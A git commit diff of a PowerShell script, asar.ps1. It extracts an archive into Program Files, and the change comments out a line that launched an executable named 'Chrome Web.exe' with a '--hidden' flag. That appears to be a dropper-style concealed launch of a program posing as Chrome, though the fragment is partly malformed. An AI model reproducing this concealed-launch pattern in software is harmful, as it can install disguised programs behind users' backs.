a9c51dd3ab2be3a5a05548a48fc8751772631656
Admo9 <135870492+Admo9@users.noreply.github.com>
2023-09-02 11:19:10 -0500

    Update asar.ps1

--- asar.ps1
+++ asar.ps1
@@ -14,7 +14,7 @@ Expand-Archive -Path C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\
 
 #Remove-Item -Force -Recurse 'C:\Users\win64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip'
 
-Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |
+#Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |
 
-select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
+#select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
 
